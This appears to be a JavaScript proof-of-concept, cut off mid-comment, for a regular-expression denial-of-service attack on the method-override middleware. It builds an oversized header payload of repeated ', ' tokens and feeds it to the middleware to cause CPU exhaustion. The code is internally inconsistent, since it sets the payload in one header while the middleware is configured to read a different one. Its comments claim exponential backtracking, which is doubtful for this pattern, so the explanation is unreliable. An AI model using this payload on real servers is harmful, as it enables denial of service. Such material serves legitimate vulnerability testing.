  const methodOverride = require('method-override');

  // The vulnerable createHeaderGetter uses split(/ *, */).
  // The regex contains overlapping optional quantifiers (* spaces before/after a comma).
  // When V8's split implementation processes a long string of repetitive ", " tokens,
  // the engine attempts to evaluate all possible space-matching permutations at each 
  // delimiter boundary. This causes catastrophic backtracking that grows exponentially 
  // with input length, quickly exceeding V8's configurable backtrack threshold.

  // Payload crafted to trigger >30,000 backtracks in controlled environments:
  const maliciousPayload = ' '.repeat(150) + Array(65536).fill(', ').join('');

  const req = {
    headers: { 'x-method-override': maliciousPayload },
    method: 'POST',
    originalMethod: 'POST',
    url: '/'
  };

  const res = { setHeader: () => {} };

  // Instantiate middleware to target the custom header, forcing createHeaderGetter execution
  const mw = methodOverride('X-Methods');

  // Direct invocation triggers vulnerable split logic.
  // In a standard Node runtime this causes high CPU usage/hang.
  // With --regexp-backtracks-before-fallback=30000 (as in the test harness), 
